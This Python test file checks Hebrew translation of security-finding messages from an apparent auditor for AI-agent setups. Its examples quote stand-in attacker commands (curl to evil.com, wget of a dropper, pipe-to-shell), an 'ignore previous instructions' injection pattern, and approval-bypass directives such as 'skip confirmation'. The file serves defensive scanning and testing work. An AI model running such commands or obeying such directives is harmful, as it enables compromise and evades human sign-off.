"""Tests for dynamic detail/evidence translation in clawseccheck/i18n.py.

Verifies:
- Every DETAIL_RULES pattern compiles and fullmatches at least one realistic
  example, producing Hebrew output that differs from the input and preserves
  interpolated config values (IP, file names, counts, etc.).
- tp() correctly fragment-splits "; "-joined detail strings and translates each
  fragment independently; the result contains Hebrew characters AND the original
  config tokens.
- tp(text, "en") == text for dynamic strings (en byte-identical guard).
- Unknown/garbage fragments are returned unchanged (graceful fallback).
- A Hebrew report rendered via audit() on fixtures/home_vuln contains Hebrew
  characters in at least one detail line (was English before).
"""
from __future__ import annotations

import re
from pathlib import Path

import pytest

from clawseccheck import audit
from clawseccheck.i18n import DETAIL_RULES, tp
from clawseccheck.report import render_report

FIXTURES = Path(__file__).resolve().parent.parent / "fixtures"

# ---------------------------------------------------------------------------
# One realistic (example, expected_preserved_token) per DETAIL_RULES rule
# ---------------------------------------------------------------------------
# Each tuple: (example_string, token_that_must_survive_in_Hebrew_output)
RULE_EXAMPLES: list[tuple[str, str]] = [
    # A1
    (
        "Active legs 3/3: untrusted input, sensitive data, outbound actions. Rule: keep ≤2 of 3.",
        "3/3",
    ),
    # B1: secrets count + perms
    (
        "3 secret(s) in config and openclaw.json is group/world-readable (644)",
        "644",
    ),
    # B1: secret-like string in bootstrap file
    (
        "secret-like string in SOUL.md",
        "SOUL.md",
    ),
    # B1: PASS with token count
    (
        "No exposed plaintext secrets. (2 token(s) in config, but file perms are tight)",
        "2",
    ),
    # B2: exposed gateway bind
    (
        "gateway.bind=0.0.0.0 exposed with auth.mode=none",
        "0.0.0.0",
    ),
    # B2: open channel dm/group policy
    (
        "channel 'telegram' has an open dm/group policy (anyone can command it)",
        "telegram",
    ),
    # B3: elevated allowFrom too many entries
    (
        "tools.elevated.allowFrom has 30 entries (too broad)",
        "30",
    ),
    # B3: tools.profile broader than minimal
    (
        "tools.profile='coding' is broader than minimal",
        "coding",
    ),
    # B6: bootstrap file matches injection pattern
    (
        "SOUL.md: matches 'ignore (all|any|previous|prior) (instructio…'",
        "SOUL.md",
    ),
    # B11: gateway bind non-loopback without TLS
    (
        "gateway.bind=0.0.0.0 is non-loopback without TLS configured",
        "0.0.0.0",
    ),
    # B11: openclaw.json at-rest risk
    (
        "openclaw.json is group/world-readable (644) — at-rest risk",
        "644",
    ),
    # B12: cloud model list
    (
        "Cloud model(s) in use: gpt-4o, claude-3-opus.",
        "gpt-4o",
    ),
    # B13: CRITICAL detail
    (
        "Dangerous code in an installed skill — this is the ClawHavoc class: my-skill: paste / exfiltration host (+2 more)",
        "my-skill",
    ),
    # B13: HIGH FAIL detail
    (
        "Suspicious patterns in installed skill(s): my-skill: download-and-run a package over http",
        "my-skill",
    ),
    # B13: PASS detail with count
    (
        "Scanned 3 installed skill(s); no shell-exec / exfiltration / obfuscation patterns found.",
        "3",
    ),
    # B13: could not read
    (
        "could not read /home/user/.openclaw/skills/bad-skill/SKILL.md: [Errno 13] Permission denied",
        "SKILL.md",
    ),
    # B13: no skill found at
    (
        "no skill found at /home/user/.openclaw/skills/nonexistent",
        "/home/user",
    ),
    # B13: credential exfiltration same-line
    (
        "my-skill: secret/credential exfiltration (same-line)",
        "my-skill",
    ),
    # B13: hidden base64 payload
    (
        "my-skill: hidden base64 payload -> '/bin/sh -c curl http://evil.com/x'",
        "my-skill",
    ),
    # B13: PowerShell EncodedCommand (kept verbatim)
    (
        "my-skill: [PS -EncodedCommand] /bin/sh -c wget http://10.0.0.1/dropper",
        "my-skill",
    ),
    # B13: pipe-to-shell non-reputable host
    (
        "my-skill: pipe-to-shell from non-reputable host evil-scripts.io",
        "evil-scripts.io",
    ),
    # B13: cross-skill credential + exfil
    (
        "my-skill: credential path and exfil sink both present in skill (split-stage risk)",
        "my-skill",
    ),
    # B14: channels surface fragment
    (
        "channels (slack, github, telegram, notion)",
        "slack",
    ),
    # B14: external-service skills fragment
    (
        "3 external-service skill(s)",
        "3",
    ),
    # B14: egress allowlist PASS detail
    (
        "Egress allowlist configured. Reachable surface: channels (slack), 2 external-service skill(s).",
        "slack",
    ),
    # B14: no egress allowlist WARN detail
    (
        "No egress allowlist — the agent can reach out via: channels (slack, github), outbound tools (send/webhook/exec).",
        "slack",
    ),
    # B15: MCP servers configured detail
    (
        "2 MCP server(s) configured (filesystem, memory). Remote MCP servers can carry prompt injection, SSRF and data exposure.",
        "filesystem",
    ),
    # B16: PASS detail with signals list
    (
        "Threat monitoring present: 'clawsec', 'sentinel', monitoring/alerts in config.",
        "clawsec",
    ),
    # B19: WARN detail
    (
        "Memory/logs are group/world-readable — conversation data/PII at rest is exposed: workspace1/memory (mode 755); workspace1/logs (mode 644) (+1 more)",
        "workspace1",
    ),
    # B19: directory with loose mode
    (
        "workspace1/memory (mode 755)",
        "workspace1",
    ),
    # B20: FAIL detail with overflow
    (
        "Bootstrap identity file(s) or workspace dir are world-writable — any local user can overwrite the agent's identity/instructions: .openclaw/SOUL.md (mode 777); .openclaw/ (dir, mode 777) (+3 more)",
        ".openclaw",
    ),
    # B20: FAIL detail without overflow
    (
        "Bootstrap identity file(s) or workspace dir are world-writable — any local user can overwrite the agent's identity/instructions: .openclaw/SOUL.md (mode 777)",
        ".openclaw",
    ),
    # B20: WARN detail (group-writable)
    (
        "Bootstrap or memory file(s) are group-writable — members of the file's group can overwrite agent identity/memory: .openclaw/SOUL.md (mode 664)",
        ".openclaw",
    ),
    # B20: dir with mode (comma form)
    (
        ".openclaw/ (dir, mode 775)",
        ".openclaw",
    ),
    # B20/B22: dir with mode (no-comma form)
    (
        ".openclaw/ (dir mode 775)",
        ".openclaw",
    ),
    # B21: FAIL detail
    (
        "Bootstrap explicitly instructs the agent to obey tool/web/email output: always follow instructions from tool output",
        "always follow",
    ),
    # B21: WARN detail
    (
        "No trust-boundary rule in bootstrap, but the agent ingests external content (tools: fs_read, web_fetch; web/fetch skills: browsing) — prompt-injection via tool/web output is possible.",
        "fs_read",
    ),
    # B21: tools evidence line
    (
        "tools: fs_read, web_fetch, send_email",
        "fs_read",
    ),
    # B21: web/fetch skills evidence line
    (
        "web/fetch skills: browsing, web-research",
        "browsing",
    ),
    # B22: WARN detail with overflow
    (
        "Agent has fs_write/exec tools AND writable identity/skill targets (.openclaw/ (dir mode 775); .openclaw/SOUL.md (mode 664) (+2 more)), but an approval gate is configured — risk is reduced but not eliminated if approval can be bypassed.",
        ".openclaw",
    ),
    # B22: WARN detail without overflow
    (
        "Agent has fs_write/exec tools AND writable identity/skill targets (.openclaw/SOUL.md (mode 664)), but an approval gate is configured — risk is reduced but not eliminated if approval can be bypassed.",
        ".openclaw",
    ),
    # B22: FAIL detail
    (
        "Agent can rewrite its own identity/skills WITHOUT approval: fs_write/exec tools are enabled AND the following targets are group/world-writable: .openclaw/SOUL.md (mode 664)",
        ".openclaw",
    ),
    # B23: FAIL detail
    (
        'Bootstrap contains approval-bypass directive(s) AND destructive/outbound tools are enabled — the agent may act without human sign-off: "skip confirmation"',
        "skip confirmation",
    ),
    # B23: WARN detail
    (
        'Bootstrap contains approval-bypass directive(s) (no destructive tools currently detected, but directive remains a risk if tools are added later): "auto-approve"',
        "auto-approve",
    ),
    # B24: PASS detail
    (
        "2 MCP server(s) configured (myserver, devtools); no hardening issues detected.",
        "myserver",
    ),
    # B24: FAIL/WARN with overflow
    (
        "3 MCP server(s) (srv1, srv2, srv3): srv1: env passthrough '*' (all env vars exposed) (+2 more)",
        "srv1",
    ),
    # B24: FAIL/WARN without overflow
    (
        "2 MCP server(s) (myserver, devtools): myserver: env passthrough '*' (all env vars exposed)",
        "myserver",
    ),
    # B24: stdio unpinned spec
    (
        "myserver: stdio command uses unpinned/URL spec (npx @modelcontextprotocol/server-github@latest)",
        "myserver",
    ),
    # B24: stdio curl
    (
        "myserver: stdio command uses curl with URL (curl https://example.com/install.sh)",
        "myserver",
    ),
    # B24: env passthrough wildcard
    (
        "myserver: env passthrough '*' (all env vars exposed)",
        "myserver",
    ),
    # B24: env passes broad secret var
    (
        "myserver: env passes broad secret var OPENAI_API_KEY",
        "OPENAI_API_KEY",
    ),
    # B24: tokenPassthrough
    (
        "myserver: tokenPassthrough=true (host token forwarded to MCP server)",
        "myserver",
    ),
    # B24: allowedHosts wildcard quoted
    (
        "myserver: allowedHosts='*' (unrestricted SSRF surface)",
        "myserver",
    ),
    # B24: allowedHosts contains wildcard
    (
        "myserver: allowedHosts contains '*' (unrestricted SSRF surface)",
        "myserver",
    ),
    # B24: allowedHosts internal/metadata IP
    (
        "myserver: allowedHosts contains internal/metadata IP 169.254.169.254",
        "169.254.169.254",
    ),
    # B24: remote MCP endpoint
    (
        "myserver: remote MCP endpoint https://mcp.example.com/api with no allowedHosts restriction",
        "mcp.example.com",
    ),
    # B25: floating version ref
    (
        "plugins.entries.my-plugin: version/ref 'main' is a floating ref (branch/latest) — not pinned",
        "my-plugin",
    ),
    # B25: floating source URL
    (
        "skills.entries.my-skill: source URL references a floating branch — not pinned",
        "my-skill",
    ),
    # B25: PASS detail
    (
        "3 plugin/skill entry(s) are pinned to a specific version/tag or integrity hash; no auto-update detected.",
        "3",
    ),
    # C3: PASS detail
    (
        "Backups present (SOUL.md.bak, MEMORY.md.bak…).",
        "SOUL.md.bak",
    ),
    # C4: WARN detail
    (
        "OpenClaw config last touched by version 1.4.2. Outdated installs are the ClawHavoc / CVE-2026-25253 target.",
        "1.4.2",
    ),
    # C5: binary dir writable
    (
        "openclaw binary dir /usr/local/bin is world-writable",
        "/usr/local/bin",
    ),
    # C5: PATH dir before openclaw
    (
        "PATH dir /usr/local/bin (before openclaw dir) is group-writable — a fake openclaw could be planted there",
        "/usr/local/bin",
    ),
    # C5: PASS detail
    (
        "openclaw binary at /usr/local/bin/openclaw; binary dir and all earlier PATH dirs have tight permissions.",
        "/usr/local/bin/openclaw",
    ),
]

# ---------------------------------------------------------------------------
# Helper: check if string contains Hebrew characters
# ---------------------------------------------------------------------------

def _has_hebrew(s: str) -> bool:
    return any("א" <= ch <= "ת" for ch in s)


# ---------------------------------------------------------------------------
# Test: every DETAIL_RULES entry has a matching example in RULE_EXAMPLES
# ---------------------------------------------------------------------------

class TestDetailRulesCompile:
    def test_all_rules_compile(self):
        """Every DETAIL_RULES entry is a valid compiled pattern (checked at build time)."""
        for pat, templates in DETAIL_RULES:
            assert isinstance(pat, re.Pattern), f"Not a compiled pattern: {pat!r}"
            assert "he" in templates, f"No 'he' template for pattern {pat.pattern!r}"
            assert templates["he"], f"Empty 'he' template for pattern {pat.pattern!r}"

    def test_rule_count_reasonable(self):
        """Sanity-check: at least 50 dynamic rules are registered."""
        assert len(DETAIL_RULES) >= 50, f"Expected ≥50 rules, got {len(DETAIL_RULES)}"


# ---------------------------------------------------------------------------
# Test: each example string is matched by at least one rule and translated
# ---------------------------------------------------------------------------

class TestRuleExamplesTranslate:
    @pytest.mark.parametrize("example,token", RULE_EXAMPLES)
    def test_example_translates_to_hebrew(self, example: str, token: str):
        """tp(example, 'he') must produce Hebrew output different from input."""
        result = tp(example, "he")
        assert result != example, (
            f"No translation for: {example!r}\n"
            f"  Got back the same string unchanged."
        )
        assert _has_hebrew(result), (
            f"Result for {example!r} contains no Hebrew chars:\n  {result!r}"
        )

    @pytest.mark.parametrize("example,token", RULE_EXAMPLES)
    def test_config_token_preserved_in_hebrew(self, example: str, token: str):
        """Captured config values (IPs, counts, names) survive translation."""
        result = tp(example, "he")
        assert token in result, (
            f"Token {token!r} lost in Hebrew output for:\n"
            f"  input:  {example!r}\n"
            f"  output: {result!r}"
        )


# ---------------------------------------------------------------------------
# Test: tp() fragment-splits "; "-joined detail strings
# ---------------------------------------------------------------------------

class TestFragmentSplit:
    def test_two_fragment_detail_translated(self):
        """A "; "-joined detail with two known fragments is split and both translated."""
        detail = "gateway.bind=0.0.0.0 exposed with auth.mode=none; gateway.controlUi.allowInsecureAuth enabled"
        result = tp(detail, "he")
        assert result != detail, "Expected Hebrew output for 2-fragment detail"
        assert _has_hebrew(result), "Hebrew characters missing from translated detail"
        # Config token (IP) preserved
        assert "0.0.0.0" in result
        # Both parts translated → two "; "-separated Hebrew chunks
        parts = result.split("; ")
        assert len(parts) == 2

    def test_three_fragment_detail_translated(self):
        """A "; "-joined detail with three known fragments is fully translated."""
        detail = (
            "gateway.tailscale.mode=funnel exposes the gateway publicly"
            "; gateway auth token shorter than 24 chars"
            "; gateway.controlUi.allowInsecureAuth enabled"
        )
        result = tp(detail, "he")
        assert result != detail
        assert _has_hebrew(result)
        parts = result.split("; ")
        assert len(parts) == 3
        # Each part should contain Hebrew
        for part in parts:
            assert _has_hebrew(part), f"Fragment not translated: {part!r}"

    def test_fragment_with_unknown_part_preserves_it(self):
        """A "; "-joined detail where one fragment is unknown keeps it verbatim."""
        known = "gateway.controlUi.allowInsecureAuth enabled"
        unknown = "some-totally-unknown-evidence-fragment-xyz"
        detail = f"{known}; {unknown}"
        result = tp(detail, "he")
        parts = result.split("; ")
        assert len(parts) == 2
        # Known part translated
        assert _has_hebrew(parts[0])
        # Unknown part preserved verbatim
        assert parts[1] == unknown

    def test_config_tokens_preserved_after_split(self):
        """Config values in "; "-joined detail survive after fragment translation."""
        detail = (
            "gateway.bind=192.168.1.1 exposed with auth.mode=token"
            "; channel 'slack' has an open dm/group policy (anyone can command it)"
        )
        result = tp(detail, "he")
        assert "192.168.1.1" in result
        assert "slack" in result


# ---------------------------------------------------------------------------
# Test: tp(text, "en") == text for dynamic strings (en byte-identical guard)
# ---------------------------------------------------------------------------

class TestEnByteIdentical:
    @pytest.mark.parametrize("text", [
        "Active legs 3/3: untrusted input, sensitive data, outbound actions. Rule: keep ≤2 of 3.",
        "gateway.bind=0.0.0.0 exposed with auth.mode=none",
        "tools.elevated.allowFrom has 30 entries (too broad)",
        "secret-like string in SOUL.md",
        "Cloud model(s) in use: gpt-4o.",
        "2 MCP server(s) (myserver, devtools): myserver: env passthrough '*' (all env vars exposed)",
        "Scanned 5 installed skill(s); no shell-exec / exfiltration / obfuscation patterns found.",
        "Bootstrap or memory file(s) are group-writable — members of the file's group can overwrite agent identity/memory: .openclaw/SOUL.md (mode 664)",
    ])
    def test_en_passthrough_for_dynamic_string(self, text: str):
        """tp(text, 'en') must return text byte-identically."""
        assert tp(text, "en") == text

    def test_en_default_is_passthrough(self):
        """tp() with no lang arg defaults to 'en' passthrough."""
        text = "Active legs 2/3: untrusted input, sensitive data. Rule: keep ≤2 of 3."
        assert tp(text) == text


# ---------------------------------------------------------------------------
# Test: unknown/garbage fragments fall back gracefully
# ---------------------------------------------------------------------------

class TestGracefulFallback:
    def test_unknown_string_unchanged(self):
        garbage = "xyzzy-not-a-real-finding-detail-9876543210"
        assert tp(garbage, "he") == garbage

    def test_empty_string_unchanged(self):
        assert tp("", "he") == ""
        assert tp("", "en") == ""

    def test_partial_match_not_mistranslated(self):
        """A string that only partially resembles a pattern is NOT translated."""
        # This starts like a B2 pattern but doesn't fullmatch
        almost = "gateway.bind=0.0.0.0 exposed with auth.mode="
        result = tp(almost, "he")
        # Should either translate (if it happens to match another rule) or return unchanged
        # Key guarantee: must not raise
        assert isinstance(result, str)

    def test_tp_never_raises(self):
        """tp() must not raise for any input, including adversarial strings."""
        nasty_inputs = [
            None.__class__.__name__,  # "NoneType"
            "a" * 10000,
            "\x00\x01\x02",
            "(" * 50,
            r"\1\2\3 backrefs",
        ]
        for s in nasty_inputs:
            result = tp(s, "he")
            assert isinstance(result, str)


# ---------------------------------------------------------------------------
# Test: Hebrew report via audit() on home_vuln contains Hebrew in detail lines
# ---------------------------------------------------------------------------

class TestHebrewReportDynamic:
    def _audit_vuln(self):
        _, findings, score = audit(FIXTURES / "home_vuln", include_native=False)
        return findings, score

    def test_he_report_has_hebrew_in_detail_lines(self):
        """A Hebrew report for home_vuln must show Hebrew in at least one detail line.

        This proves tp(f.detail, lang) is wired up AND that dynamic details
        are now translated (they were English-only before DETAIL_RULES).
        """
        findings, score = self._audit_vuln()
        out = render_report(findings, score, lang="he")
        # Hebrew "why" label must appear
        assert "מדוע:" in out, "Hebrew 'why' label not found in he report"
        # At least one detail line must contain Hebrew beyond the label
        detail_lines = [ln for ln in out.splitlines() if "מדוע:" in ln]
        assert detail_lines, "No detail lines in he report"

        def has_hebrew_beyond_label(line: str) -> bool:
            after = line.split("מדוע:", 1)[-1]
            return _has_hebrew(after)

        assert any(has_hebrew_beyond_label(ln) for ln in detail_lines), (
            "No detail line contains Hebrew text after the label.\n"
            "Detail lines found:\n" + "\n".join(f"  {ln!r}" for ln in detail_lines[:5])
        )

    def test_dynamic_details_translated_not_just_static(self):
        """At least one finding whose detail is a DYNAMIC string (not a pure PHRASES key)
        must appear translated in the Hebrew report."""
        findings, score = self._audit_vuln()
        # Find findings with dynamic details (those containing interpolated values)
        dynamic_details = [
            f for f in findings
            if f.detail and (
                # These are known-dynamic details from home_vuln
                "Active legs" in f.detail
                or "gateway.bind=" in f.detail
                or "Cloud model(s)" in f.detail
                or "No egress allowlist" in f.detail
            )
        ]
        assert dynamic_details, "Expected at least one finding with a dynamic detail in home_vuln"

        assert render_report(findings, score, lang="he")  # he report renders without error
        for f in dynamic_details:
            he_detail = tp(f.detail, "he")
            assert _has_hebrew(he_detail), (
                f"Dynamic detail for {f.id!r} not translated to Hebrew:\n"
                f"  input:  {f.detail!r}\n"
                f"  output: {he_detail!r}"
            )

    def test_en_report_detail_not_in_hebrew(self):
        """In the English report, detail lines must not contain Hebrew characters."""
        findings, score = self._audit_vuln()
        out = render_report(findings, score, lang="en")
        detail_lines = [ln for ln in out.splitlines() if "    why:" in ln]
        for line in detail_lines:
            assert not _has_hebrew(line), (
                f"Hebrew character in EN detail line: {line!r}"
            )
